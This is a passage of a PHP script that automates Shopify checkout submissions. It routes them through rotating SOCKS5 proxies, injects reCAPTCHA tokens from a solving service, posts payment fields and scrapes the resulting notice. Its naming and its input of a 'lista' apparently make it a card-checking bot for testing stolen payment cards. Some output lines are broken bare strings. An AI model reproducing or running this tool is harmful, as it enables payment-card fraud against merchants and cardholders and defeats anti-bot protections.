curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$status = $js["status"];

if ($status != "processing") {
    break;
}
}

$captcha = $js["solution"]['gRecaptchaResponse'];

"\n";
"Finish ... recaptcha";
"\n";
"gRecaptchaResponse : $captcha";
"\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s=&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&g-recaptcha-response='.$captcha.'&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);

}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "$url/processing");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: */*';
$headers[] = 'Referer: https://'.$pag_host.'/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);

sleep(1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "$url/processing?from_processing_page=1");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: */*';
$headers[] = 'Referer: https://'.$pag_host.'/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
sleep(3);

return $curl;
}


$curl = ShopifyIa($url,trim($lista), $solver);

$resp = GetStr($curl, '<p class="notice__text">', '</p>');

echo "mgs = $resp \n";
